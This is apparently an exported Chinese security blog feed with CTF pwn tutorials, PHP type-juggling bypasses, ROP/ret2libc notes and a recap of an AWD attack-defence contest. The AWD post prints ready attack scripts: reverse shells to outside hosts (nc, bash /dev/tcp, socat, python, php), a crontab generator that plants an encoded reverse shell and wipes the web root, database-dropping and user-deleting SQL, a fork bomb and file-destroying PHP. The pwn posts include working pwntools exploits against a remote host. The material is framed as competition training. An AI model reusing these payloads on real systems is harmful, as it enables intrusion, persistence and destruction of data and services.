&emsp;&emsp;不知是用了什么妖术,这个变量居然是根据esp来进行寻址的…众所周知esp是随时变化的,因此我们就需要动态调试,算一下变量距离ebp的偏移.输入一下命令启动gdb: 123&gt; gdb ret2text# 进来之后输入start启动程序gdb&gt; start &emsp;&emsp;你会看到你的gdb跟我的一比简直low爆了…这是因为我装了插件,诸位暂时还是不要安装插件,因为你对gdb还不够熟悉,如果十分想要模仿我的话可以安装peda或者pwndbg. 12git clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit &emsp;&emsp;接下来输入disas可以看到即将会执行的汇编指令: 12345678910111213141516171819202122232425262728gef➤ disasDump of assembler code for function main: 0x08048648 &lt;+0&gt;: push ebp 0x08048649 &lt;+1&gt;: mov ebp,esp 0x0804864b &lt;+3&gt;: and esp,0xfffffff0 0x0804864e &lt;+6&gt;: add esp,0xffffff80=&gt; 0x08048651 &lt;+9&gt;: mov eax,ds:0x804a060 0x08048656 &lt;+14&gt;: mov DWORD PTR [esp+0xc],0x0 0x0804865e &lt;+22&gt;: mov DWORD PTR [esp+0x8],0x2 0x08048666 &lt;+30&gt;: mov DWORD PTR [esp+0x4],0x0 0x0804866e &lt;+38&gt;: mov DWORD PTR [esp],eax 0x08048671 &lt;+41&gt;: call 0x80484d0 &lt;setvbuf@plt&gt; 0x08048676 &lt;+46&gt;: mov eax,ds:0x804a040 0x0804867b &lt;+51&gt;: mov DWORD PTR [esp+0xc],0x0 0x08048683 &lt;+59&gt;: mov DWORD PTR [esp+0x8],0x1 0x0804868b &lt;+67&gt;: mov DWORD PTR [esp+0x4],0x0 0x08048693 &lt;+75&gt;: mov DWORD PTR [esp],eax 0x08048696 &lt;+78&gt;: call 0x80484d0 &lt;setvbuf@plt&gt; 0x0804869b &lt;+83&gt;: mov DWORD PTR [esp],0x804876c 0x080486a2 &lt;+90&gt;: call 0x8048480 &lt;puts@plt&gt; 0x080486a7 &lt;+95&gt;: lea eax,[esp+0x1c] 0x080486ab &lt;+99&gt;: mov DWORD PTR [esp],eax 0x080486ae &lt;+102&gt;: call 0x8048460 &lt;gets@plt&gt; 0x080486b3 &lt;+107&gt;: mov DWORD PTR [esp],0x80487a4 0x080486ba &lt;+114&gt;: call 0x8048450 &lt;printf@plt&gt; 0x080486bf &lt;+119&gt;: mov eax,0x0 0x080486c4 &lt;+124&gt;: leave 0x080486c5 &lt;+125&gt;: ret &emsp;&emsp;若安装了插件输入register指令可以查看寄存器信息: 12345678910111213gef➤ register$eax : 0xf7f90dc8 → 0xffffd0cc → 0xffffd2cc → "CLUTTER_IM_MODULE=fcitx"$ebx : 0x0 $ecx : 0xcab951ef$edx : 0xffffd054 → 0x00000000$esp : 0xffffcfa0 → 0x00000000$ebp : 0xffffd028 → 0x00000000$esi : 0xf7f8f000 → 0x001d9d6c$edi : 0xf7f8f000 → 0x001d9d6c$eip : 0x08048651 → &lt;main+9&gt; mov eax, ds:0x804a060$eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 gef➤ &emsp;&emsp;若没有安装插件则使用print $eax打印相关寄存器信息.&emsp;&emsp;接着输入n或者s可以单步进行调试,他们的区别是: n: 假如有函数调用的话,会直接执行完毕该函数,然后继续单步执行 s: 假如有函数调用的话,会进入函数然后继续单步执行 &emsp;&emsp;好的,我们可以一路按n跑到关键位置,也可以在关键位置下断点然后让程序停在那里: 1234567891011121314151617gef➤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gef➤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf);────────────────────────[ registers ]────$eax : 0xffffcd5c → 0x08048329 → "__libc_start_main"$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 → 0x00000000$esp : 0xffffcd40 → 0xffffcd5c → 0x08048329 → "__libc_start_main"$ebp : 0xffffcdc8 → 0x00000000$esi : 0xf7fae000 → 0x001b1db0$edi : 0xf7fae000 → 0x001b1db0$eip : 0x080486ae → &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; &emsp;&emsp;这里我们看到esp是 0xffffcd40,ebp 为具体的 payload 如下 0xffffcdc8，同时 s 相对于 esp 的索引为 [esp+0x1c]，所以，s 的地址为 0xffffcd5c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。 exp如下: 1234567#!/usr/bin/python2from pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c+4) + p32(target))sh.interactive() &emsp;&emsp;现在你已经稍微入点高级编程门了. &emsp;&emsp;如果你对pwn也感兴趣的话可以去校内ctf练习平台上玩一玩(题目很久没更新了…最近更新一下qaq) 关于作者及作者内心os&emsp;&emsp;信安1802某爱猫人士,安全研究员,梦想成为Computer Artist并养一屋子猫 &emsp;&emsp;当你读到这段话的时候…十有八九是前面读不下去了,直接跳到最后看看还有多少… &emsp;&emsp;我还是要讲几句鼓励你的话: ​ 加油,你真棒! &emsp;&emsp; &emsp;&emsp;如果你对本文档持任何异议,请纠缠我的基友原计1805戏曲爱好者孙某. PS: 如果你也是爱猫人士或者对计算机安全感兴趣,欢迎与各位大佬交流 (CTF缺队友…qaq 欢迎Follow我的github ^_^]]></content>
  </entry>
  <entry>
    <title><![CDATA[Heap结构整理]]></title>
    <url>%2F2019%2F10%2F15%2FHeap%E7%BB%93%E6%9E%84%E6%95%B4%E7%90%86%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[web知识点记录]]></title>
    <url>%2F2019%2F09%2F15%2Fweb%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近一直在写CPU,好久没有看web相关的东西了,发现之前刷的题全忘了qaq…本文记录遇到的相关知识点. 辣鸡PHP 弱类型&emsp;&emsp;php的&#39;===&#39;与==是截然不同的,===会在判断前首先比较两变量类型,然后进行值的比较,但是==则强制转换为相同的类型,然后进行比较. 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 &emsp;&emsp;举几个例子:1234567&lt;?php var_dump("admin"==0); //true var_dump("1admin"==1); //true var_dump("admin1"==1) //false var_dump("admin1"==0) //true var_dump("0e123456"=="0e4456789"); //true ?&gt; &emsp;&emsp;PHP手册里说:当一个字符串被当作一个数值来取值,其结果和类型如下:如果该字符串没有包含 ‘.’ ‘e’ ‘E’并且其数值值在整形的范围之内该字符串被当作int来取值,其他所有情况下都被作为float来取值,该字符串的开始部分决定了它的值,如果该字符串以合法的数值开始,则使用该数值,否则其值为0. 利用姿势 &emsp;&emsp;md5-hash碰撞12345678910111213141516&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $Username = $_GET['Username']; $password = $_GET['password']; if (!ctype_alpha($Username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($Username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo "successful"; &#125;else&#123; echo "login failed!"; &#125; &#125;?&gt; &emsp;&emsp;根据上面的原理我们可以发现假如md5的开头是0e,那么比较时会被当作科学计数法,直接gg. 1md5('240610708') == md5('QNKCDZO'); &emsp;&emsp;json绕过 123456789101112131415&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key ="*********"; if ($message-&gt;key == $key) &#123; echo "flag"; &#125; else &#123; echo "fail"; &#125; &#125; else&#123; echo "~~~~"; &#125;?&gt; &emsp;&emsp;我们并不知道$key的值,但是当$message-&gt;key为整数时,$key也会被转化为整数,因此构造payload如下: 1message=&#123;&quot;key&quot;:0&#125; &emsp;&emsp;array_search()绕过 1234567891011121314151617&lt;?phpif(!is_array($_GET['test']))&#123;exit();&#125;$test=$_GET['test'];for($i=0;$i&lt;count($test);$i++)&#123; if($test[$i]==="admin")&#123; echo "error"; exit(); &#125; $test[$i]=intval($test[$i]);&#125;if(array_search("admin",$test)===0)&#123; echo "flag";&#125;else&#123; echo "false";&#125;?&gt; &emsp;&emsp;array_search()这个函数在php Manual手册中写道: 1mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] ); &emsp;&emsp;在$haystack中查找$needle,若查到则返回index索引,第三个参数是选择是否开启严格比较.默认情况下比较模式为==,因此payload如下: 1test[]=0 同样in_array()也有此漏洞 &emsp;&emsp;strcmp()漏洞绕过php -v &lt; 5.3 1234567891011&lt;?php $password="***************" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo "Right!!!login success";n exit(); &#125; else &#123; echo "Wrong password.."; &#125;?&gt; &emsp;&emsp;strcmp会比较两个字符串,若两者相等则返回0,但是当两者的类型不同时,strcmp()会发生错误,但是仍然会判断其相等.因此我们可以传入password[]=xx来进行绕过. 同样md5() sha1()等函数也存在类似漏洞. &emsp;&emsp;switch绕过 1234567891011121314151617181920&lt;?php$a="4admin";switch ($a) &#123; case 1: echo "fail1"; break; case 2: echo "fail2"; break; case 3: echo "fail3"; break; case 4: echo "sucess"; //结果输出success; break; default: echo "failall"; break;&#125;?&gt; &emsp;&emsp;原理与上类似,不再阐述.]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蓝帽杯awd总结]]></title>
    <url>%2F2019%2F08%2F23%2F%E8%93%9D%E5%B8%BD%E6%9D%AFawd%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近沉迷于学习verilog以及计算机底层的相关知识,已经很久没有搞安全了.突然有机会打一场向往已久的AWD令我很是期待.终于我和朴淳 国峰 兴致冲冲的来到了国家会议中心,好生气派. &emsp;&emsp;下午比赛刚开始,所有服务器直接宕机…不得不说奇安信这个做的不好.过了很久之后修好了,然后我们直接就被打懵了.一直疯狂掉分,直到挂上waf才稍有好转.总结一下学到的一点经验: 关于进攻 &emsp;&emsp;反正这一次一下攻击都没有打,全程做防御.因为根本来不及代码审计,赛后问了一下对面的大佬怎么打的,他们说是thinkphp的cve,他们也就找到一个洞,然后就进了前十…可见赛前资料的准备有多么重要.另外就后门而言,见到了好几个特别骚的木马,当然不死马是最基础的,其实不死马能起作用主要是因为目录权限配置的有问题,主目录直接给了777肯定会被日啊.普通目录尽量别给写的权限. &emsp;&emsp;还有一种马是base64加密马,然后添加crontab来写一句话木马.妈的这个是真的难受,我只能写shell一直删,还有就是一定要搅屎.我们有个nginx服务直接被删掉了,我都没发现有这个目录…然后服务一down开始疯狂掉分,我只好去偷别人的静态网页,诶,心里苦. &emsp;&emsp;关于搅屎,我痛定思痛,写了好几个搅屎棍: 无限复制: 12345678&lt;?php set_time_limit(0); ignore_user_abort(true); while(1)&#123; file_put_contents(randstr().'.php',file_get_content(__FILE__)); file_get_contents("http://127.0.0.1/"); &#125;?&gt; 连名都是随机的,疯狂占资源,算是ddos吧 改数据库密码: 123456update mysql.user set authentication_string=PASSWORD('p4rr0t');# 修改所有用户密码flush privileges;UPDATE mysql.user SET User='aaaaaaaaaaaa' WHERE user='root'; flush privileges;delete from mysql.user ;#删除所有用户flush privileges; &emsp;&emsp;当时比赛的时候没想起来… 各种crontab骚东西: 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python3import base64def crontab_reverse(reverse_ip, reverse_port): crontab_path = "/tmp" cmd = 'bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1' % (reverse_ip, reverse_port) crontab_cmd = "* * * * * bash -c '%s'\n" % cmd encode_crontab_cmd = base64.b64encode(crontab_cmd) cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat &gt;&gt; " + crontab_path + "/tmp_rev.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf" return cmddef crontab_rm(rm_paths='/var/www/html/'): crontab_path = "/tmp" cmd = '/bin/rm -rf %s' % rm_paths crontab_cmd = "* * * * * %s\n" % cmd encode_crontab_cmd = base64.b64encode(crontab_cmd) cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat &gt;&gt; " + crontab_path + "/tmp_rm.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf" return cmddef crontab_flag_submit(flag_server, flag_port, flag_api, flag_token, flag_host): crontab_path = '/tmp' cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&amp;flag=$(curl %s)" ' % ( flag_server, flag_port, flag_api, flag_token, flag_host) crontab_cmd = "* * * * * %s\n" % cmd encode_crontab_cmd = base64.b64encode(crontab_cmd) cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat &gt;&gt; " + crontab_path + "/tmp_submit.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf" return cmd# cmd = crontab_flag_submit(flag_server='0.0.0.0', # flag_port='8888', # flag_api='submit', # flag_token='bcbe3365e6ac95ea2c0343a2395834dd', # flag_host='http://192.168.100.1/Getkey')# print(cmd)cmd = crontab_reverse('202.204.62.222',6666)print(cmd) &emsp;&emsp;这个应该算是最牛逼的马了,waf基本挡不住,杀也杀不死. 疯狂日apache2和nigix: 123456#!/usr/bin/env shwhile [[ 1 ]]do service apache2 stop service nginx stopdone &amp; &emsp;&emsp;杀不死基本凉凉,服务down扣分贼严重, 删东西: 123456789101112131415161718192021222324&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); function getfiles($path)&#123; foreach(glob($path) as $afile)&#123; if(is_dir($afile)) getfiles($afile.'/*.php'); else @file_put_contents($afile,"#Anything#"); //unlink($afile); &#125; &#125; while(1)&#123; getfiles(__DIR__); sleep(10); &#125;?&gt;&lt;?php set_time_limit(0); ignore_user_abort(1); array_map('unlink', glob("some/dir/*.php"));?&gt; &emsp;&emsp;不说了,心里痛…qaq 删库跑路: 123456789#!/usr/bin/env python3import base64def rm_db(db_user,my_db_passwd): cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd) db_name = ['performance_schema','mysql','flag'] for db in db_name: cmd += "drop database %s;"%db cmd += "'" return cmd &emsp;&emsp;这个应该也是杀伤力极强,基本不会有人备份库子… fork_bomb 12#!/bin/sh/bin/echo '.() &#123; .|.&amp; &#125; &amp;&amp; .' &gt; /tmp/aaa;/bin/bash /tmp/aaa; &emsp;&emsp;这东西不及时发现就凉了,磁盘一会就爆了 反弹后门技巧 shell 1234nc -e /bin/bash 1.3.3.7 4444bash -c 'bash -i &gt;/dev/tcp/1.3.3.7/4444 0&gt;&amp;1'zsh -c 'zmodload zsh/net/tcp &amp;&amp; ztcp 1.3.3.7 4444 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY'socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444 python 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' php 1php -r '$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' windows 1nc.exe -e /bin/bash 1.3.3.7 4444 &emsp;&emsp;看到这么多罪恶的脚本心里好受了许多 一定要记得流量混淆,瞎鸡儿发一下垃圾包假装连一句话混淆视听 关于防御 &emsp;&emsp;防御是真的难,但也基本就一下几点: 日志 /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/nginx/error.log 要快速弄清楚服务的目录,做好备份!!!!!!! 去看/etc/apache2/ports.conf和/etc/apache2/sites-available/000-default.conf,快速找到目录和对应端口 去/etc/nginx/ 基本差不多 不做备份哭鸡鸡 配置目录权限,尽量不要给777 挂waf,但是框架挂waf有些困难,我得再研究一下挂在哪里比较合适,盲猜得挂路由… 这是我魔改的蜜罐,过滤了crontab和base64,我真是怕了… 需要注意的是,最好建一个log目录然后给777,最好不要直接把log写在当前目录下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phperror_reporting(0);define('LOG_FILENAME', 'log.txt');function waf() &#123; if (!function_exists('getallheaders')) &#123; function getallheaders() &#123; foreach ($_SERVER as $name =&gt; $value) &#123; if (substr($name, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))) ] = $value; &#125; return $headers; &#125; &#125; $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER["REMOTE_ADDR"]; $method = $_SERVER['REQUEST_METHOD']; $filepath = $_SERVER["SCRIPT_NAME"]; //rewirte shell which uploaded by others, you can do more foreach ($_FILES as $key =&gt; $value) &#123; $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); file_put_contents($_FILES[$key]['tmp_name'], "virink"); &#125; unset($header['Accept']); //fix a bug $input = array( "Get" =&gt; $get, "Post" =&gt; $post, "Cookie" =&gt; $cookie, "File" =&gt; $files, "Header" =&gt; $header ); //deal with $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"; $pattern.= "|file_put_contents|fwrite|curl|system|eval|assert|crontab|base64"; $pattern.= "|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"; $pattern.= "|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"; $vpattern = explode("|", $pattern); $bool = false; foreach ($input as $k =&gt; $v) &#123; foreach ($vpattern as $value) &#123; foreach ($v as $kk =&gt; $vv) &#123; if (preg_match("/$value/i", $vv)) &#123; $bool = true; logging($input); break; &#125; &#125; if ($bool) break; &#125; if ($bool) break; &#125;&#125;function logging($var) &#123; file_put_contents(LOG_FILENAME, "\r\n" . time() . "\r\n" . print_r($var, true) , FILE_APPEND); // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);&#125;waf();?&gt; 写shell监视文件变化 不死马删除 杀死www-data的进程,然后新建一个同名的文件 crontab马…只能写shell了,或者用php脚本删除crontab 12#!/usr/bin/env shps -aux|grep 'www-data'|awk '&#123;print $2&#125;'|xargs kill -9 总结 &emsp;&emsp;其实awd不在于漏洞多,在于cve的利用和搅屎,有一段时间我们没有掉分结果排名十分靠前,说明能进攻的队基本没几个,所以在准备不周的情况下做好防御就行了.&emsp;&emsp;然后就是赛后一定要多尝试,要去熟悉主流框架的cve比如thinkphp laravel之类的.真正比赛的时候根本来不及仔细看哪些是后门,也没时间代码审计,全靠手感和经验. 广告 &emsp;&emsp;这是我写的awd攻击框架(虽然没用上…),能批量shell执行,很舒服.欢迎体验parrot_shell &emsp;&emsp;最后来一张队友合照,嘿嘿404 forever]]></content>
  </entry>
  <entry>
    <title><![CDATA[adworld_pwn部分writeUp]]></title>
    <url>%2F2019%2F06%2F03%2Fadworld-pwn%E9%83%A8%E5%88%86writeUp%2F</url>
    <content type="text"><![CDATA[stack2 &emsp;&emsp;首先checksec一下发现有canary，然后托到ida里看一下，发现大部分变量都是 unsigned int 类型，考虑到可能会有整数溢出。接着我们发现可以通过 change number 选项来直接修改栈上的数据，因此我们想到直接修改返回地址，如图： &emsp;&emsp;接着我们发现 hackhere 函数，里面是直接调用的 1system("/bin/bash"); &emsp;&emsp;因此，我们可以直接将返回地址修改为这里，我们注意到数组的类型是 char ，因此在发送payload的时候可以直接按照小端序字符逐位发送。 &emsp;&emsp;但是这里有一个坑点，我们通过静态分析发现数组距离 return_addr 的位置为0x74： &emsp;&emsp;但是我们在实际动态调试的时候发现其实际偏移为0x84，这里是因为，在进入main函数时进行了一步esp的对齐： 123456789101112131415#开头| ; arg int arg_4h @ esp+0x4| 0x080485d0 8d4c2404 lea ecx, dword [arg_4h] ; 4| 0x080485d4 83e4f0 and esp, 0xfffffff0| 0x080485d7 ff71fc push dword [ecx - 4]| 0x080485da 55 push ebp| 0x080485db 89e5 mov ebp, esp| 0x080485dd 51 push ecx----------------------------------------------------------------#结尾| 0x080488eb 8b4dfc mov ecx, dword [local_4h]| 0x080488ee c9 leave| 0x080488ef 8d61fc lea esp, dword [ecx - 4]\ 0x080488f2 c3 ret &emsp;&emsp;其实这里没有必要深入计算，因为动态调试可以算出偏移为0x84,但是作为一个知识点，我们还是要讨论一下这个main函数的返回方式，我们遇到过很多main函数通过ecx进行返回，并且有esp对其的过程。 &emsp;&emsp;这一次，首先将 $esp + 4 放入ecx，然后 and esp,0xfffffff0 的作用是将esp的后4位清零(一个16进制位代表4个2进制位)，然后将 $ecx - 4 压入栈中。注意，这里的 $ecx - 4 实际上就是return_addr,因为在进入main函数时，esp的位置就是return_addr,然后 lea ecx, dword [arg_4h] 这条语句将其实是把第一个参数的地址传给ecx，然后esp对齐后将return_addr压入栈中，然后就是正常的保存栈状态的操作。由于对齐esp的操作导致栈被拉长，拉伸的长度只能动态调试确定，此时栈大概是这样： 12345678910 high | arg_4 | | return_addr | return_addr 1 | ..................... |after align some span | ecx - 4 | return_addr 2 | ebp | | ecx | low | .................... | &emsp;&emsp;返回的时候就恢复ecx的值然后直接利用 [ecx - 4] 回到return_addr1的位置。 因此，payload如下： 1234567891011121314151617181920212223242526from pwn import *context.log_level = "debug"system_addr = 0x804859B#sh = process("./stack2")sh = remote("111.198.29.45",53413)sh.recv()sh.sendline('1')sh.recv()sh.sendline('1')def fuck(index, value): sh.sendline("3") sh.recv() sh.sendline(str(index)) sh.recv() sh.sendline(str(value)) sh.recv()fuck(0x84,0x9b)fuck(0x85,0x85)fuck(0x86,0x04)fuck(0x87,0x08)sh.interactive() &emsp;&emsp;但是打过去之后发现系统提示:1"/usr/bin/bash" not found &emsp;&emsp;所以我们只好直接调用 system函数，并将sh传参给它，因此payload如下：123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom pwn import *context.log_level = "debug"#sh = process("./stack2")sh = remote("111.198.29.45",53413)sys_addr = 0x0804859bsh.recv()sh.sendline('1')sh.recv()sh.sendline('1')def fuck(index, value): sh.sendline("3") sh.recv() sh.sendline(str(index)) sh.recv() sh.sendline(str(value)) sh.recv()fuck(0x84, 0x50)fuck(0x85, 0x84)fuck(0x86, 0x04)fuck(0x87, 0x08)#中间流出了4个字节，用于存放 fake_return_addressfuck(0x8c, 0x87) #这里我们发现地址是奇数位，是因为我们直接把bash拆开成了shfuck(0x8d, 0x89)fuck(0x8e, 0x04)fuck(0x8f, 0x08)sh.sendline("5")sh.interactive() pwn1 babystack&emsp;&emsp;checksec后我们发现程序开启了canary，大概要进行canary的泄漏。 &emsp;&emsp;在对main函数进行静态分析后我们发现了一个明显的溢出点， read() 函数存在经典溢出，而且在 case 2 处我们可以通过 puts() 函数泄露canary的值。 &emsp;&emsp;对于canary的泄漏方式，最简单的一种是覆盖其最低为的 \x00 字节，防止截断，然后通过puts将其泄漏出来。 &emsp;&emsp;仔细审计程序之后，我们基本清楚了攻击流程，首先这是一个经典的菜单类程序，通过case 1我们可以覆盖栈上的数据，因此，第一步我们先填充padding来覆盖canary的低位字节经计算offset为136个字节。 &emsp;&emsp;接着case 2打印canary，第二步，我们要通过rop来泄露system与bin_sh的地址。查询后发现了比较好用的 pop rdi ; ret .这个时候payload已经基本清楚了，用puts泄漏计算偏移，然后case 3退出是返回到main，接着case 3退出返回到system。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env pythonfrom pwn import *# sh = process('./babystack')sh = remote('111.198.29.45',35646) context.log_level = 'debug'elf = ELF('./babystack')libc = ELF('./libc-2.23.so')puts_got = elf.got['puts']puts_plt = elf.symbols['puts']puts_libc = libc.symbols['puts']system_libc = libc.symbols['system']pop_rdi = 0x00400a93main = 0x00400908log.info('puts_got ' + hex(puts_got))log.info('puts_plt ' + hex(puts_plt))log.info('puts_libc ' + hex(puts_libc))padding = 'a' * 136#get_canarysh.recvuntil('&gt;&gt; ')sh.sendline('1')sh.sendline(padding)sh.recvuntil('&gt;&gt; ')sh.sendline('2')sh.recvuntil('a' * 136)canary = u64(sh.recv()[:8]) - 0xalog.info('canary ' + hex(canary))#get_systemdef getTarget(target, canary): payload = 'a' * (0x90 - 0x8) + p64(canary) + 'b' * 8 + p64(pop_rdi) + p64(target) + p64(puts_plt) payload += p64(main) sh.recvuntil('&gt;&gt; ') sh.sendline('1') sleep(0.01) sh.sendline(payload) sh.recvuntil('&gt;&gt; ') sh.sendline('3') # sh.recvuntil('b'*8) addr = u64(sh.recv()[:6].ljust(8, '\x00')) return addrsh.sendline('\n')sh.recv()puts_addr = getTarget(puts_got, canary)log.info('puts_addr ' + hex(puts_addr))#get_offset_system_bin_sh offset = puts_addr - puts_libcsystem_addr = system_libc + offset bin_sh = offset + libc.search("/bin/sh").next()log.info('system_addr ' + hex(system_addr))log.info('bin_sh ' + hex(bin_sh))#fuckupsh.sendline('\n')sh.recv()sh.sendline('1')payload = 'a' * (0x90 - 0x8) + p64(canary) + 'b' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)payload += p64(main)sh.sendline(payload)sh.recv()sh.sendline('3')sh.interactive() &emsp;&emsp;在输入输出那里比较坑，需要多调几下。]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于libc与rop的思考]]></title>
    <url>%2F2019%2F04%2F11%2F%E5%85%B3%E4%BA%8Elibc%E4%B8%8Erop%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[那些奇妙的组合 &emsp;&emsp;这两天读了一些书，学了一些新的知识，关于libc我们比较熟悉的是通过write() puts()等函数来泄漏system()和/bin/sh的实际地址，然后通过缓冲区溢出来进行利用，这是常见而基础的ret2libc。&emsp;&emsp;但是我们来想想这几种情况，假如程序是64位那么我们如何将参数传入函数，假如我们没有拿到libc.so那么我们如何计算偏移，一般来说处理这中情况往往需要一些骚操作，以rop来实现libc泄漏往往是绕不过的。举个简单例子，在x86中write()传参是这样的：1payload = 'a' * 0x80 + p32(write_got) + p32(vuln) + p32(0) + p32(address_to_leak) + p32(8) &emsp;&emsp;通过调用write函数来泄漏address_to_leak的真实地址，一般我们会选择write_got自己或者libc_start_main_got来进行泄漏，因为 延迟绑定 的原因，只有被调用过的函数，他的got表里才会储存该函数在内存中的实际地址。 关于这一部分大家可以读一度《程序员的自我修养这本书》，还有下面这篇文章：got&amp;plt详细的介绍了got与plt以及延迟绑定的问题 &emsp;&emsp;我们现在就来总结一下如何处理x64的libc泄漏问题。 1.直接寻找可用于传参的budget&emsp;&emsp;既然要泄漏地址，那么必然要使用write()与puts()等函数，这个过程就涉及到参数的传递，不像x86那样可以用栈传递参数，x64拥有更多的寄存器，所以会优先选择使用寄存器来传递参数，关于寄存器我们需要将一下传参规则，先看下图： &emsp;&emsp;我们可以看到64位的程序的参数在6个以内时会优先调用寄存器，而使用的顺序如下： 1234567891011%rdi =&gt; arg1%rsi =&gt; arg2%rdx =&gt; arg3%rcx =&gt; arg4%r8 =&gt; arg5%r9 =&gt; arg6 &emsp;&emsp;而 %rax 依旧用于保存返回值。知道这些储备知识以后，我们来开一个使用gadgets来控制程序的例子。 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;void systemaddr()&#123; void* handle = dlopen("libc.so.6", RTLD_LAZY); printf("%p\n",dlsym(handle,"system")); fflush(stdout);&#125;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; systemaddr(); write(1, "Hello, World\n", 13); vulnerable_function();&#125; gcc -fno-stack-procter -no-pie -o rop_libc rop_libc1 &emsp;&emsp;我们首先可以看到一个明显的缓冲区溢出，而且程序会自动输出system()在内存中的实际地址，这个时候我们可以想到只需要拥有 “/bin/sh” 就可以走上人生巅峰，这个时候我们考虑使用gadgets来将 “/bin/sh” 的地址传入 rdi。ok，用ROPgadget来搜索一波： 123456789101112131415ROPgadget --binary rop_libc1 --only "pop|ret"====================================================0x0000000000001294 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001296 : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001298 : pop r14 ; pop r15 ; ret0x000000000000129a : pop r15 ; ret0x0000000000001293 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001297 : pop rbp ; pop r14 ; pop r15 ; ret0x000000000000116f : pop rbp ; ret0x000000000000129b : pop rdx ; ret0x0000000000001299 : pop rsi ; pop r15 ; ret0x0000000000001295 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001016 : ret0x0000000000001072 : ret 0x2f0x000000000000119a : ret 0xfffe &emsp;&emsp;我们发现结果并不理想，由于这个程序太小了，里面竟然没有 pop rdi ; ret 这条指令，那么我们只好换个思路，为什么不直接使用libc.so里的gadgets呢？灵机一动之后，我们想到可用使用write()来泄漏libc.so里的指令地址，话不多说，先搜一下symbols地址： 1234ROPgadget --binary libc.so.6 --only "pop|ret" =====================================================0x000000000002456f : pop rdi ; pop rbp ; ret0x0000000000023a5f : pop rdi ; ret &emsp;&emsp;果然命中注定的那个它出现了，0x23a5f：pop rdi ; ret 就是我们想要的gadgets，我们可以构造rop链了。 1payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr) 